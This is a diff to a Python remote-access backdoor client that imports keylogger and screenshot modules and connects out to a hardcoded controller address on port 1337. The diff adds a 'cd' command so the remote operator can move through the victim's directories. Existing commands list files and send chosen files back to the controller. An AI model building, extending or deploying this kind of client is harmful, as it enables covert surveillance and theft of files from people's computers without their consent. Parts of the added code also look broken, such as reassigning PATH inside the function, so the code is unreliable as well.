@@ -4,6 +4,7 @@ import traceback
 import glob
 from threading import Thread
 import time
+import os
 import screenshot
 import key_logger
 
@@ -13,7 +14,7 @@ def main():
     #host = '192.168.43.85'
     host = '192.168.43.211'
     port = 1337
-
+    PATH = "."
     try:
         soc.connect((host, port))
         print("connected")
@@ -42,11 +43,9 @@ def main():
             load_file(soc)
             is_active = False
         elif("ls" in client_input):
-            g = glob.glob("*")
-            print(glob.glob("*"))
-            s = ""
-            for i in g:
-                s += i + '\n'
+            g = [os.path.basename(i) for i in glob.glob("{}\\*".format(PATH))]
+            print(g)
+            s = "\n".join(g)
             soc.sendall(s.encode('utf-8'))
         elif("pull" in client_input):
             name = soc.recv(1024)
@@ -54,6 +53,15 @@ def main():
             send_file(name, soc)
             soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             soc.connect((host, port))
+
+        elif("cd" in client_input):
+            name = soc.recv(1024)
+            if os.path.exists("{}\\{}".format(PATH, name.decode('utf-8'))):
+                
+                PATH += "\\{}".format(name.decode('utf-8'))
+                soc.sendall("Success".encode('utf-8'))
+            else:
+                soc.sendall("Netu".encode('utf-8'))
             #is_active = False
 
 def load_file(c):
